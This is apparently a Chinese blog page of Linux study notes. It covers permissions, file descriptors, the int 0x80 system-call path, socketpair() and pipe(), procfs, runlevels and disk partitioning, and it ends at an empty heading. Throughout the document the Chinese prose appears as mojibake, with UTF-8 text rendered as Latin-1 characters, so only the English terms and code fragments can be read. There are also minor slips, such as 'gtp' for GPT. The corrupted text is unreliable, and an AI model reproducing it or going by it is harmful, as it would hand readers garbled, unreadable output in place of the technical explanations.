<h3 id="Linux-æƒé™å‘½ä»¤"><a href="#Linux-æƒé™å‘½ä»¤" class="headerlink" title="Linux æƒé™å‘½ä»¤"></a>Linux æƒé™å‘½ä»¤</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848133.png" alt="Linuxæƒé™è§£è¯»"></p>
<p>æ–‡ä»¶çš„ç±»å‹ï¼š</p>
<ul>
<li>dï¼š ä»£è¡¨ç›®å½•</li>
<li>-ï¼š ä»£è¡¨æ–‡ä»¶</li>
<li>lï¼š ä»£è¡¨è½¯é“¾æ¥ï¼ˆå¯ä»¥è®¤ä¸ºæ˜¯ window ä¸­çš„å¿«æ·æ–¹å¼ï¼‰</li>
</ul>
<p>Linux ä¸­æƒé™åˆ†ä¸ºä»¥ä¸‹å‡ ç§ï¼š</p>
<ul>
<li>rï¼šä»£è¡¨æƒé™æ˜¯å¯è¯»ï¼Œr ä¹Ÿå¯ä»¥ç”¨æ•°å­— 4 è¡¨ç¤º</li>
<li>wï¼šä»£è¡¨æƒé™æ˜¯å¯å†™ï¼Œw ä¹Ÿå¯ä»¥ç”¨æ•°å­— 2 è¡¨ç¤º</li>
<li>xï¼šä»£è¡¨æƒé™æ˜¯å¯æ‰§è¡Œï¼Œx ä¹Ÿå¯ä»¥ç”¨æ•°å­— 1 è¡¨ç¤º</li>
</ul>
<p> è¶…çº§ç”¨æˆ·å¯ä»¥æ— è§†æ™®é€šç”¨æˆ·çš„æƒé™ï¼Œå³ä½¿æ–‡ä»¶ç›®å½•æƒé™æ˜¯000ï¼Œä¾æ—§å¯ä»¥è®¿é—®ã€‚</p>
<p>åœ¨ linux ä¸­çš„æ¯ä¸ªç”¨æˆ·å¿…é¡»å±äºä¸€ä¸ªç»„ï¼Œä¸èƒ½ç‹¬ç«‹äºç»„å¤–ã€‚åœ¨linuxä¸­æ¯ä¸ªæ–‡ä»¶æœ‰æ‰€æœ‰è€…ã€æ‰€åœ¨ç»„ã€å…¶å®ƒç»„çš„æ¦‚å¿µã€‚</p>
<ul>
<li>æ‰€æœ‰è€…ï¼ˆuï¼‰ ï¼šä¸€èˆ¬ä¸ºæ–‡ä»¶çš„åˆ›å»ºè€…ï¼Œè°åˆ›å»ºäº†è¯¥æ–‡ä»¶ï¼Œå°±å¤©ç„¶çš„æˆä¸ºè¯¥æ–‡ä»¶çš„æ‰€æœ‰è€…ï¼Œç”¨ ls â€ahl å‘½ä»¤å¯ä»¥çœ‹åˆ°æ–‡ä»¶çš„æ‰€æœ‰è€…ä¹Ÿå¯ä»¥ä½¿ç”¨ chown ç”¨æˆ·åæ–‡ä»¶åæ¥ä¿®æ”¹æ–‡ä»¶çš„æ‰€æœ‰è€… ã€‚</li>
<li>æ–‡ä»¶æ‰€åœ¨ç»„ï¼ˆgï¼‰ ï¼šå½“æŸä¸ªç”¨æˆ·åˆ›å»ºäº†ä¸€ä¸ªæ–‡ä»¶åï¼Œè¿™ä¸ªæ–‡ä»¶çš„æ‰€åœ¨ç»„å°±æ˜¯è¯¥ç”¨æˆ·æ‰€åœ¨çš„ç»„ç”¨ ls â€ahlå‘½ä»¤å¯ä»¥çœ‹åˆ°æ–‡ä»¶çš„æ‰€æœ‰ç»„ä¹Ÿå¯ä»¥ä½¿ç”¨ chgrp ç»„å æ–‡ä»¶åæ¥ä¿®æ”¹æ–‡ä»¶æ‰€åœ¨çš„ç»„ã€‚</li>
<li>å…¶å®ƒç»„ï¼ˆoï¼‰ ï¼šé™¤å¼€æ–‡ä»¶çš„æ‰€æœ‰è€…å’Œæ‰€åœ¨ç»„çš„ç”¨æˆ·å¤–ï¼Œç³»ç»Ÿçš„å…¶å®ƒç”¨æˆ·éƒ½æ˜¯æ–‡ä»¶çš„å…¶å®ƒç»„ã€‚</li>
</ul>
<h2 id="Linuxæ–‡ä»¶æè¿°ç¬¦ï¼ˆå¥æŸ„ï¼‰"><a href="#Linuxæ–‡ä»¶æè¿°ç¬¦ï¼ˆå¥æŸ„ï¼‰" class="headerlink" title="Linuxæ–‡ä»¶æè¿°ç¬¦ï¼ˆå¥æŸ„ï¼‰"></a>Linuxæ–‡ä»¶æè¿°ç¬¦ï¼ˆå¥æŸ„ï¼‰</h2><p>æè¿°ç¬¦è¡¨ï¼ˆdescriptor tableï¼‰ï¼šæ¯ä¸ªè¿›ç¨‹éƒ½æœ‰å®ƒç‹¬ç«‹çš„æè¿°ç¬¦è¡¨ï¼Œå®ƒçš„è¡¨é¡¹æ˜¯ç”±è¿›ç¨‹æ‰“å¼€çš„æ–‡ä»¶æè¿°ç¬¦æ¥ç´¢å¼•çš„ã€‚æ¯ä¸ªæ‰“å¼€çš„æè¿°ç¬¦è¡¨é¡¹æŒ‡å‘æ–‡ä»¶è¡¨ä¸­çš„ä¸€ä¸ªè¡¨é¡¹ã€‚</p>
<p>æ–‡ä»¶è¡¨ï¼ˆfile tableï¼‰ï¼šæ‰“å¼€æ–‡ä»¶çš„é›†åˆæ˜¯ç”±ä¸€å¼ æ–‡ä»¶è¡¨æ¥è¡¨ç¤ºçš„ï¼Œæ‰€æœ‰çš„è¿›ç¨‹å…±äº«è¿™å¼ è¡¨ã€‚æ¯ä¸ªæ–‡ä»¶è¡¨çš„è¡¨é¡¹ç»„æˆï¼ˆé’ˆå¯¹æˆ‘ä»¬çš„ç›®çš„ï¼‰åŒ…æ‹¬å½“å‰çš„æ–‡ä»¶ä½ç½®ã€å¼•ç”¨è®¡æ•°ï¼ˆreference countï¼‰ ï¼ˆå³å½“å‰æŒ‡å‘è¯¥è¡¨é¡¹çš„æè¿°ç¬¦è¡¨é¡¹æ•°ï¼‰ï¼Œä»¥åŠä¸€ä¸ªæŒ‡å‘v-nodeè¡¨ä¸­å¯¹åº”è¡¨é¡¹çš„æŒ‡é’ˆã€‚å…³é—­ä¸€ä¸ªæè¿°ç¬¦ä¼šå‡å°‘å¯¹åº”çš„æ–‡ä»¶è¡¨é¡¹ä¸­çš„å¼•ç”¨è®¡æ•°ã€‚å†…æ ¸ä¸ä¼šåˆ é™¤è¿™ä¸ªæ–‡ä»¶è¡¨è¡¨é¡¹ï¼Œç›´åˆ°å®ƒçš„å¼•ç”¨è®¡æ•°ä¸ºé›¶ã€‚</p>
<p>v-nodeè¡¨ï¼ˆv-node tableï¼‰ï¼šåŒæ–‡ä»¶è¡¨ä¸€æ ·ï¼Œæ‰€æœ‰çš„è¿›ç¨‹å…±äº«è¿™å¼ v-nodeè¡¨ã€‚æ¯ä¸ªè¡¨é¡¹åŒ…å«statç»“æ„ä¸­çš„å¤§å¤šæ•°ä¿¡æ¯ï¼ŒåŒ…æ‹¬st_modeå’Œst_sizeæˆå‘˜ï¼ŒåŒä¸€ä¸ªæ–‡ä»¶v-node tableç›¸åŒã€‚</p>
<p>å¤šä¸ªæè¿°ç¬¦ä¹Ÿå¯ä»¥é€šè¿‡ä¸åŒçš„æ–‡ä»¶è¡¨é¡¹æ¥å¼•ç”¨åŒä¸€ä¸ªæ–‡ä»¶ã€‚ä¾‹å¦‚åŒä¸€ä¸ªfilenameè°ƒç”¨openå‡½æ•°ä¸¤æ¬¡ï¼Œå°±ä¼šå‘ç”Ÿè¿™ç§æƒ…å†µã€‚</p>
<p>open()å‡½æ•°æ‰€åšçš„äº‹æƒ…å°±æ˜¯å°†ä¼ è¿›å»çš„å­—ç¬¦ä¸²çš„è·¯å¾„åœ¨å†…æ ¸é‡Œé¢è½¬æ¢æˆç›¸åº”çš„inodeèŠ‚ç‚¹å’Œç»“æ„ä½“ã€‚æ‰§è¡Œè¿™ä¸€ä»»åŠ¡çš„æ ‡å‡†è¿‡ç¨‹å°±æ˜¯åˆ†æè·¯å¾„åå¹¶æŠŠå®ƒæ‹†åˆ†æˆä¸€ä¸ªæ–‡ä»¶ååºåˆ—ï¼Œé™¤äº†æœ€åä¸€ä¸ªæ–‡ä»¶åä»¥å¤–ï¼Œæ‰€æœ‰çš„æ–‡ä»¶åéƒ½å¿…å®šæ˜¯ç›®å½•ã€‚</p>
<p>ç„¶åç‚¹å‡»readè°ƒç”¨åä¼šä»å¥æŸ„ä¸­è·å–ä¿¡æ¯ï¼Œç„¶åå°†å¯¹åº”çš„é¡µè¯»åˆ°å†…æ ¸å†…å­˜ä¸­ï¼Œç„¶åå°†å†…æ ¸bufferçš„å†…å®¹æ”¾åˆ°åº”ç”¨ç¨‹åºbufferé‡Œã€‚</p>
<ul>
<li>ä¹ æƒ¯ä¸Šï¼Œæ ‡å‡†è¾“å…¥ï¼ˆstandard inputï¼‰çš„æ–‡ä»¶æè¿°ç¬¦æ˜¯ 0ï¼Œæ ‡å‡†è¾“å‡ºï¼ˆstandard outputï¼‰æ˜¯ 1ï¼Œæ ‡å‡†é”™è¯¯ï¼ˆstandard errorï¼‰æ˜¯ 2ã€‚</li>
<li>0ï¼Œ1ï¼Œ2å¯¹åº”çš„ç‰©ç†è®¾å¤‡ä¸€èˆ¬æ˜¯ï¼šé”®ç›˜ï¼Œæ˜¾ç¤ºå™¨ï¼Œæ˜¾ç¤ºå™¨ã€‚</li>
<li>æ‰€ä»¥é€šå¸¸å½“æˆ‘ä»¬æˆåŠŸæ‰“å¼€æ–‡ä»¶æ—¶ï¼Œè¿”å›çš„fdéƒ½æ˜¯ä»3èµ·ã€‚</li>
</ul>
<p>å¥æŸ„ï¼ˆfile descriptorï¼Œfdï¼‰ï¼š</p>
<p>closeï¼ˆfdï¼‰ä¹‹åå¥æŸ„å°±è¿”å›ç»™ç³»ç»Ÿï¼Œä¾‹å¦‚æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶åfdæ˜¯3ï¼Œcloseä¹‹åå†æ‰“å¼€å¦å¤–ä¸€ä¸ªæ–‡ä»¶ä¹Ÿè¿˜æ˜¯3ï¼Œä½†ä»£è¡¨çš„æ–‡ä»¶ä¸ä¸€æ ·äº†ã€‚</p>
<h2 id="Linuxç³»ç»Ÿè°ƒç”¨å®ç°æœºåˆ¶"><a href="#Linuxç³»ç»Ÿè°ƒç”¨å®ç°æœºåˆ¶" class="headerlink" title="Linuxç³»ç»Ÿè°ƒç”¨å®ç°æœºåˆ¶"></a>Linuxç³»ç»Ÿè°ƒç”¨å®ç°æœºåˆ¶</h2><h3 id="ç³»ç»Ÿè°ƒç”¨åˆå§‹åŒ–"><a href="#ç³»ç»Ÿè°ƒç”¨åˆå§‹åŒ–" class="headerlink" title="ç³»ç»Ÿè°ƒç”¨åˆå§‹åŒ–"></a>ç³»ç»Ÿè°ƒç”¨åˆå§‹åŒ–</h3><p>ç³»ç»Ÿè°ƒç”¨å¤„ç†ç¨‹åº system_call() çš„å…¥å£åœ°å€æ”¾åœ¨ç³»ç»Ÿçš„ä¸­æ–­æè¿°ç¬¦è¡¨IDTï¼ˆInterrupt Descriptor Tableï¼‰(ä¸€å…±æœ‰255ä¸ª)ä¸­ï¼ŒLinuxç³»ç»Ÿåˆå§‹åŒ–æ—¶ï¼Œç”± trap_init() å°†å…¶å¡«å†™å®Œæ•´ï¼Œå…¶è®¾ç½®ç³»ç»Ÿè°ƒç”¨å¤„ç†ç¨‹åºçš„è¯­å¥ä¸ºï¼š</p>
<p>set_system_gate(0x80, &amp;system_call)<br>ç»è¿‡åˆå§‹åŒ–ä»¥åï¼Œæ¯å½“æ‰§è¡Œ int 0x80(è½¯ä¸­æ–­) æŒ‡ä»¤æ—¶ï¼Œäº§ç”Ÿä¸€ä¸ªå¼‚å¸¸ä½¿ç³»ç»Ÿé™·å…¥å†…æ ¸ç©ºé—´å¹¶æ‰§è¡Œ128å·å¼‚å¸¸å¤„ç†ç¨‹åºï¼Œå³ç³»ç»Ÿè°ƒç”¨å¤„ç†ç¨‹åº system_call() ã€‚</p>
<h3 id="ç³»ç»Ÿè°ƒç”¨å…¬å…±å…¥å£"><a href="#ç³»ç»Ÿè°ƒç”¨å…¬å…±å…¥å£" class="headerlink" title="ç³»ç»Ÿè°ƒç”¨å…¬å…±å…¥å£"></a>ç³»ç»Ÿè°ƒç”¨å…¬å…±å…¥å£</h3><p>system_call() æ˜¯æ‰€æœ‰ç³»ç»Ÿè°ƒç”¨çš„å…¬å…±å…¥å£ï¼Œå…¶åŠŸèƒ½æ˜¯ä¿æŠ¤ç°åœºï¼Œè¿›è¡Œæ­£ç¡®æ€§æ£€æŸ¥ï¼Œæ ¹æ®ç³»ç»Ÿè°ƒç”¨å·è·³è½¬åˆ°å…·ä½“çš„å†…æ ¸å‡½æ•°ã€‚å†…æ ¸å‡½æ•°æ‰§è¡Œå®Œæ¯•æ—¶éœ€è°ƒç”¨ ret_from_sys_call() ï¼Œè¿™æ—¶å®Œæˆè¿”å›ç”¨æˆ·ç©ºé—´å‰çš„æœ€åæ£€æŸ¥ï¼Œç”¨ RESTORE_ALL å®æ¢å¤ç°åœºå¹¶æ‰§è¡Œ iret æŒ‡ä»¤è¿”å›ç”¨æˆ·æ–­ç‚¹ã€‚</p>
<h3 id="ä¿æŠ¤ç°åœº"><a href="#ä¿æŠ¤ç°åœº" class="headerlink" title="ä¿æŠ¤ç°åœº"></a>ä¿æŠ¤ç°åœº</h3><ul>
<li><p>ç¡¬ä»¶ï¼ˆCPUï¼‰ä¿æŠ¤ï¼šss ã€ esp ã€ eflags ã€ cs ã€ eip ï¼Œå‹å…¥æ ¸å¿ƒæ ˆï¼›</p>
</li>
<li><p>è½¯ä»¶ï¼ˆæ“ä½œç³»ç»Ÿï¼‰ä¿æŠ¤ </p>
<ul>
<li><p>ä½¿ç”¨ SAVE_ALL å®å°†å¯„å­˜å™¨å‹å…¥å †æ ˆï¼ŒåŠ è½½å†…æ ¸çš„ ds å’Œ es ï¼Œå¾€ edx ä¸­æ”¾å…¥ $(_KERNEL_DS) ä»¥æŒ‡æ˜ä½¿ç”¨å†…æ ¸æ•°æ®æ®µï¼ŒæŠŠå†…æ ¸æ•°æ®æ®µé€‰æ‹©ç¬¦è£…å…¥ ds å’Œ es ã€‚æ³¨æ„ï¼šè¯¥å®å‹å…¥å¯„å­˜å™¨çš„é¡ºåºä¸æ˜¯éšæ„çš„ï¼Œè€Œæ˜¯å’Œç³»ç»Ÿè°ƒç”¨çš„å‚æ•°ä¼ é€’å¯†åˆ‡ç›¸å…³ï¼›</p>
</li>
<li><p>es ã€ ds ã€ eax ã€ ebp ã€ edi ã€ esi ã€ edx ã€ ecx ã€ ebx ï¼Œå‹å…¥æ ¸å¿ƒæ ˆã€‚</p>
</li>
</ul>
</li>
</ul>
<p>ç³»ç»Ÿè°ƒç”¨å¤„ç†æ—¶çš„æ ¸å¿ƒæ ˆå†…å®¹ï¼š</p>
<p>ç¡¬ä»¶å®Œæˆ : ss esp eflags cs eip<br>è½¯ä»¶å®Œæˆ : es ds eax ebp edi esi edx ecx ebx</p>
<h3 id="è¿”å›å€¼ä¼ é€’"><a href="#è¿”å›å€¼ä¼ é€’" class="headerlink" title="è¿”å›å€¼ä¼ é€’"></a>è¿”å›å€¼ä¼ é€’</h3><p>å½“å†…æ ¸å‡½æ•°è¿”å›åˆ° system_call() æ—¶ï¼Œ eaxä¸­å­˜æ”¾ç€å†…æ ¸å‡½æ•°çš„è¿”å›å€¼ã€‚è¦å°†è¿™ä¸ªè¿”å›å€¼ä¼ é€’ç»™åº”ç”¨ç¨‹åºï¼Œå†…æ ¸å…ˆå°† eax æ”¾å…¥åŸå…ˆ SAVE_ALL å®ä¿å­˜ eax çš„ä½ç½®ï¼Œè¿™æ ·å½“ system_call() è°ƒç”¨ RESTORE_ALL æ¢å¤å¯„å­˜å™¨æ—¶ï¼Œ eax ä¾¿è¢«æ¢å¤æˆç³»ç»Ÿè°ƒç”¨çš„è¿”å›å€¼ï¼Œå®Œæˆäº†è¿”å›å€¼ä»å†…æ ¸ç©ºé—´åˆ°ç”¨æˆ·ç©ºé—´çš„ä¼ é€’ã€‚</p>
<h3 id="ç³»ç»Ÿè°ƒç”¨å·å’Œç³»ç»Ÿè°ƒç”¨è¡¨"><a href="#ç³»ç»Ÿè°ƒç”¨å·å’Œç³»ç»Ÿè°ƒç”¨è¡¨" class="headerlink" title="ç³»ç»Ÿè°ƒç”¨å·å’Œç³»ç»Ÿè°ƒç”¨è¡¨"></a>ç³»ç»Ÿè°ƒç”¨å·å’Œç³»ç»Ÿè°ƒç”¨è¡¨</h3><p>ç³»ç»Ÿè°ƒç”¨çš„æ•°é‡ç”± NR_syscalls å®ç»™å®šï¼Œæ¯ä¸ªç³»ç»Ÿè°ƒç”¨æ‰€å¯¹åº”çš„ç¼–å·å·²é¢„å…ˆåœ¨ç³»ç»Ÿæ–‡ä»¶ä¸­å®šä¹‰ï¼Œä¸”éƒ½ç”¨ä¸€ä¸ªå®è¡¨ç¤ºï¼Œå…¶å®šä¹‰æœ‰å¦‚ä¸‹å½¢å¼ï¼š</p>
<p>#define _NR_exit 1<br>#define _NR_fork 2<br>#define _NR_read 3<br>â€¦<br>Linuxçš„ç³»ç»Ÿè°ƒç”¨å·å’Œå†…æ ¸å‡½æ•°æ˜ å°„å…³ç³»çš„ç³»ç»Ÿè°ƒç”¨è¡¨ä¹Ÿè¢«é¢„å…ˆå®šä¹‰åœ¨ç³»ç»Ÿæ–‡ä»¶ä¸­ï¼Œå…·æœ‰å¦‚ä¸‹å½¢å¼ï¼š</p>
<p>.data<br>ENTRY(sys_call_table)<br>    .long SYMBOL_NAME(sys_ni_syscall)    &#x2F;* ç©ºé¡¹ *&#x2F;<br>    .long SYMBOL_NAME(sys_exit)<br>    .long SYMBOL_NAME(sys_fork)<br>    .long SYMBOL_NAME(sys_read)<br>â€¦</p>
<p>å†…æ ¸å‡½æ•°å…¥å£åœ°å€ä¸ºï¼š eax * 4 + sys_call_table ã€‚</p>
<h2 id="Linuxå†…æ ¸å‡½æ•°"><a href="#Linuxå†…æ ¸å‡½æ•°" class="headerlink" title="Linuxå†…æ ¸å‡½æ•°"></a>Linuxå†…æ ¸å‡½æ•°</h2><h3 id="socketpair"><a href="#socketpair" class="headerlink" title="socketpair()"></a>socketpair()</h3><p>socketpair()å‡½æ•°ç”¨äºåˆ›å»ºä¸€å¯¹æ— åçš„ã€ç›¸äº’è¿æ¥çš„å¥—æ¥å­ã€‚<br>å¦‚æœå‡½æ•°æˆåŠŸï¼Œåˆ™è¿”å›0ï¼Œåˆ›å»ºå¥½çš„å¥—æ¥å­—åˆ†åˆ«æ˜¯sv[0]å’Œsv[1]ï¼›å¦åˆ™è¿”å›-1ï¼Œé”™è¯¯ç ä¿å­˜äºerrnoä¸­ã€‚</p>
<p>åŸºæœ¬ç”¨æ³•ï¼š </p>
<ol>
<li>è¿™å¯¹å¥—æ¥å­—å¯ä»¥ç”¨äºå…¨åŒå·¥é€šä¿¡ï¼Œæ¯ä¸€ä¸ªå¥—æ¥å­—æ—¢å¯ä»¥è¯»ä¹Ÿå¯ä»¥å†™ã€‚ä¾‹å¦‚ï¼Œå¯ä»¥å¾€sv[0]ä¸­å†™ï¼Œä»sv[1]ä¸­è¯»ï¼›æˆ–è€…ä»sv[1]ä¸­å†™ï¼Œä»sv[0]ä¸­è¯»ï¼› </li>
<li>å¦‚æœå¾€ä¸€ä¸ªå¥—æ¥å­—(å¦‚sv[0])ä¸­å†™å…¥åï¼Œå†ä»è¯¥å¥—æ¥å­—è¯»æ—¶ä¼šé˜»å¡ï¼Œåªèƒ½åœ¨å¦ä¸€ä¸ªå¥—æ¥å­—ä¸­(sv[1])ä¸Šè¯»æˆåŠŸï¼› </li>
<li>è¯»ã€å†™æ“ä½œå¯ä»¥ä½äºåŒä¸€ä¸ªè¿›ç¨‹ï¼Œä¹Ÿå¯ä»¥åˆ†åˆ«ä½äºä¸åŒçš„è¿›ç¨‹ï¼Œå¦‚çˆ¶å­è¿›ç¨‹ã€‚å¦‚æœæ˜¯çˆ¶å­è¿›ç¨‹æ—¶ï¼Œä¸€èˆ¬ä¼šåŠŸèƒ½åˆ†ç¦»ï¼Œä¸€ä¸ªè¿›ç¨‹ç”¨æ¥è¯»ï¼Œä¸€ä¸ªç”¨æ¥å†™ã€‚å› ä¸ºæ–‡ä»¶æè¿°å‰¯sv[0]å’Œsv[1]æ˜¯è¿›ç¨‹å…±äº«çš„ï¼Œæ‰€ä»¥è¯»çš„è¿›ç¨‹è¦å…³é—­å†™æè¿°ç¬¦, åä¹‹ï¼Œå†™çš„è¿›ç¨‹å…³é—­è¯»æè¿°ç¬¦ã€‚</li>
</ol>
<h3 id="pipe"><a href="#pipe" class="headerlink" title="pipe()"></a>pipe()</h3><p><a href="https://blog.csdn.net/qq_42914528/article/details/82023408">https://blog.csdn.net/qq_42914528/article/details/82023408</a></p>
<p>pipeï¼ˆï¼‰åˆ›å»ºä¸€ä¸ªç®¡é“ï¼Œä¸€ä¸ªå¯ç”¨äºè¿›ç¨‹é—´é€šä¿¡çš„å•å‘æ•°æ®é€šé“ã€‚æ•°ç»„pipefdç”¨äºè¿”å›å¼•ç”¨ç®¡é“æœ«ç«¯çš„ä¸¤ä¸ªæ–‡ä»¶æè¿°ç¬¦ã€‚pipefd[0]è¡¨ç¤ºç®¡é“çš„è¯»å–ç«¯ã€‚pipefd[1]è¡¨ç¤ºç®¡é“çš„å†™å…¥ç«¯ã€‚å†™å…¥ç®¡é“å†™å…¥ç«¯çš„æ•°æ®ç”±å†…æ ¸ç¼“å†²ï¼Œç›´åˆ°ä»ç®¡é“è¯»å–ç«¯è¯»å–ä¸ºæ­¢ã€‚æœ‰å…³æ›´å¤šè¯¦ç»†ä¿¡æ¯ï¼Œè¯·å‚é˜…ç®¡é“ï¼ˆ7ï¼‰ã€‚</p>
<p>ç®¡é“æ˜¯ä¸€ç§æœ€åŸºæœ¬çš„IPCæœºåˆ¶ï¼Œä½œç”¨äºæœ‰è¡€ç¼˜å…³ç³»çš„è¿›ç¨‹ä¹‹é—´ï¼Œå®Œæˆæ•°æ®ä¼ é€’ã€‚è°ƒç”¨pipeç³»ç»Ÿå‡½æ•°å³å¯åˆ›å»ºä¸€ä¸ªç®¡é“ã€‚æœ‰å¦‚ä¸‹ç‰¹è´¨ï¼š</p>
<ol>
<li><p>å…¶æœ¬è´¨æ˜¯ä¸€ä¸ªä¼ªæ–‡ä»¶(å®ä¸ºå†…æ ¸ç¼“å†²åŒº)</p>
</li>
<li><p>ç”±ä¸¤ä¸ªæ–‡ä»¶æè¿°ç¬¦å¼•ç”¨ï¼Œä¸€ä¸ªè¡¨ç¤ºè¯»ç«¯ï¼Œä¸€ä¸ªè¡¨ç¤ºå†™ç«¯ã€‚</p>
</li>
<li><p>è§„å®šæ•°æ®ä»ç®¡é“çš„å†™ç«¯æµå…¥ç®¡é“ï¼Œä»è¯»ç«¯æµå‡ºã€‚</p>
</li>
</ol>
<p>ç®¡é“çš„åŸç†ï¼šç®¡é“å®ä¸ºå†…æ ¸ä½¿ç”¨ç¯å½¢é˜Ÿåˆ—æœºåˆ¶ï¼Œå€ŸåŠ©å†…æ ¸ç¼“å†²åŒº(4k)å®ç°ã€‚</p>
<p>ç®¡é“çš„å±€é™æ€§ï¼š</p>
<p>â‘  æ•°æ®è‡ªå·±è¯»ä¸èƒ½è‡ªå·±å†™ã€‚</p>
<p>â‘¡ æ•°æ®ä¸€æ—¦è¢«è¯»èµ°ï¼Œä¾¿ä¸åœ¨ç®¡é“ä¸­å­˜åœ¨ï¼Œä¸å¯åå¤è¯»å–ã€‚</p>
<p>â‘¢ ç”±äºç®¡é“é‡‡ç”¨åŠåŒå·¥é€šä¿¡æ–¹å¼ã€‚å› æ­¤ï¼Œæ•°æ®åªèƒ½åœ¨ä¸€ä¸ªæ–¹å‘ä¸ŠæµåŠ¨ã€‚</p>
<p>â‘£ åªèƒ½åœ¨æœ‰å…¬å…±ç¥–å…ˆçš„è¿›ç¨‹é—´ä½¿ç”¨ç®¡é“ã€‚</p>
<p>å¸¸è§çš„é€šä¿¡æ–¹å¼æœ‰ï¼Œå•å·¥é€šä¿¡ã€åŠåŒå·¥é€šä¿¡ã€å…¨åŒå·¥é€šä¿¡ã€‚</p>
<p>tcpåè®®ç½‘ç»œæ•°æ®ä¼šåˆ†åŒ…,å¦‚æœæ²¡æœ‰å…¨éƒ¨åˆ°è¾¾ï¼Œå†…æ ¸æœ‰bufferã€‚</p>
<p>åœ¨è®¸å¤šç±» Unix è®¡ç®—æœºç³»ç»Ÿä¸­ï¼Œ procfs æ˜¯ è¿›ç¨‹ æ–‡ä»¶ç³»ç»Ÿ (file system) çš„ç¼©å†™ï¼ŒåŒ…å«ä¸€ä¸ªä¼ªæ–‡ä»¶ç³»ç»Ÿï¼ˆå¯åŠ¨æ—¶åŠ¨æ€ç”Ÿæˆçš„æ–‡ä»¶ç³»ç»Ÿï¼‰ï¼Œç”¨äºé€šè¿‡å†…æ ¸è®¿é—®è¿›ç¨‹ä¿¡æ¯ã€‚è¿™ä¸ªæ–‡ä»¶ç³»ç»Ÿé€šå¸¸è¢«æŒ‚è½½åˆ° &#x2F;proc ç›®å½•ã€‚ç”±äº &#x2F;proc ä¸æ˜¯ä¸€ä¸ªçœŸæ­£çš„æ–‡ä»¶ç³»ç»Ÿï¼Œå®ƒä¹Ÿå°±ä¸å ç”¨å­˜å‚¨ç©ºé—´ï¼Œåªæ˜¯å ç”¨æœ‰é™çš„å†…å­˜ã€‚</p>
<p>æŒ‚è½½ï¼Ÿ</p>
<p>æŒ‚è½½ï¼ˆmountingï¼‰æ˜¯æŒ‡ç”±æ“ä½œç³»ç»Ÿä½¿ä¸€ä¸ªå­˜å‚¨è®¾å¤‡ï¼ˆè¯¸å¦‚ç¡¬ç›˜ã€CD-ROMæˆ–å…±äº«èµ„æºï¼‰ä¸Šçš„ç”µè„‘æ–‡ä»¶å’Œç›®å½•å¯ä¾›ç”¨æˆ·é€šè¿‡è®¡ç®—æœºçš„æ–‡ä»¶ç³»ç»Ÿè®¿é—®çš„ä¸€ä¸ªè¿‡ç¨‹ã€‚</p>
<p>ä¸€èˆ¬æ¥è¯´ï¼Œå½“è®¡ç®—æœºå…³æœºæ—¶ï¼Œæ¯ä¸ªå·²æŒ‚è½½å­˜å‚¨éƒ½å°†ç»å†ä¸€æ¬¡å¸è½½ï¼Œä»¥ç¡®ä¿æ‰€æœ‰æ’é˜Ÿçš„æ•°æ®è¢«å†™å…¥ï¼Œå¹¶ä¿è¯ä»‹è´¨ä¸Šæ–‡ä»¶ç³»ç»Ÿç»“æ„çš„å®Œæ•´æ€§ã€‚</p>
<h2 id="Linuxç³»ç»Ÿä¸­çš„7ç§è¿è¡Œçº§åˆ«"><a href="#Linuxç³»ç»Ÿä¸­çš„7ç§è¿è¡Œçº§åˆ«" class="headerlink" title="Linuxç³»ç»Ÿä¸­çš„7ç§è¿è¡Œçº§åˆ«"></a>Linuxç³»ç»Ÿä¸­çš„7ç§è¿è¡Œçº§åˆ«</h2><p>è¿è¡Œçº§åˆ«è¯´æ˜:</p>
<ul>
<li><p>0:å…³æœº</p>
</li>
<li><p>1 :å•ç”¨æˆ·[ç±»ä¼¼å®‰å…¨æ¨¡å¼ï¼Œè¿™ä¸ªæ¨¡å¼å¯ä»¥å¸®åŠ©æ‰¾å›rootå¯†ç ] </p>
</li>
<li><p>2:å¤šç”¨æˆ·çŠ¶æ€æ²¡æœ‰ç½‘ç»œæœåŠ¡</p>
</li>
<li><p>3:å¤šç”¨æˆ·çŠ¶æ€æœ‰ç½‘ç»œæœåŠ¡ [ä½¿ç”¨æœ€å¤š]</p>
</li>
<li><p>4:ç³»ç»Ÿæœªä½¿ç”¨ä¿ç•™ç»™ç”¨æˆ·</p>
</li>
<li><p>5:å›¾å½¢ç•Œé¢ </p>
</li>
<li><p>6:ç³»ç»Ÿé‡å¯</p>
</li>
</ul>
<p>å¸¸ç”¨è¿è¡Œçº§åˆ«æ˜¯ <strong>3</strong> å’Œ <strong>5</strong> ï¼Œè¦ä¿®æ”¹é»˜è®¤çš„è¿è¡Œçº§åˆ«å¯æ”¹æ–‡ä»¶</p>
<h2 id="Linuxç£ç›˜åˆ†åŒºã€æŒ‚è½½"><a href="#Linuxç£ç›˜åˆ†åŒºã€æŒ‚è½½" class="headerlink" title="Linuxç£ç›˜åˆ†åŒºã€æŒ‚è½½"></a>Linuxç£ç›˜åˆ†åŒºã€æŒ‚è½½</h2><ul>
<li>mbråˆ†åŒº:</li>
</ul>
<p>1.æœ€å¤šæ”¯æŒå››ä¸ªä¸»åˆ†åŒº</p>
<p>2.ç³»ç»Ÿåªèƒ½å®‰è£…åœ¨ä¸»åˆ†åŒº</p>
<p>3.æ‰©å±•åˆ†åŒºè¦å ä¸€ä¸ªä¸»åˆ†åŒº</p>
<p>4.MBRæœ€å¤§åªæ”¯æŒ2TBï¼Œä½†æ‹¥æœ‰æœ€å¥½çš„å…¼å®¹æ€§</p>
<ul>
<li>gtpåˆ†åŒº:</li>
</ul>
<p>1.æ”¯æŒæ— é™å¤šä¸ªä¸»åˆ†åŒºï¼ˆä½†æ“ä½œç³»ç»Ÿå¯èƒ½é™åˆ¶ï¼Œæ¯”å¦‚ windowsä¸‹æœ€å¤š128ä¸ªåˆ†åŒºï¼‰</p>
<p>2.æœ€å¤§æ”¯æŒ18EBçš„å¤§å®¹é‡ï¼ˆ1EB&#x3D;1024 PBï¼Œ1PB&#x3D;1024 TB ï¼‰</p>
<p>3.windows7 64ä½ä»¥åæ”¯æŒgtp</p>
<p>åŸç†ä»‹ç»</p>
